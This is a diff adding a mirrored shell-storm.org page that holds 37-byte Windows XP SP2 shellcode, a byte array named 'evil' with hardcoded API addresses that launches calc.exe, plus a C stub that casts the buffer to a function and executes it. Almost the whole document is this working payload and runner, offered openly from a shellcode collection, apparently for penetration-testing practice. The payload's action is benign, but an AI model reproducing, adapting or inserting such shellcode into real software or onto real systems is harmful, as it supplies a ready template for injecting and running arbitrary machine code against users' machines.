@@ -1,0 +1,33 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-576.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Windows - SP2 english ( calc.exe ) - 37 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+/*
+ * Windows Xp Home edition SP2 english ( calc.exe ) 37 bytes shellcode
+ * by: Hazem mofeed Aka Hakxer
+ * penetration testing labs
+ *   www.pentestlabs.com
+ */
+ 
+char evil[] =
+&quot;\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x8d\x15\x86\x7c\xff\xd3\x31\xc0&quot;
+&quot;\x50\xbb\xea\xcd\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c&quot;
+&quot;\x63\x2e\x65\x78\x65\x00&quot;;
+ 
+int main(int argc, char **argv)
+{
+int (*shellcode)();
+shellcode = (int (*)()) evil;
+(int)(*shellcode)();
+}
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-576.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
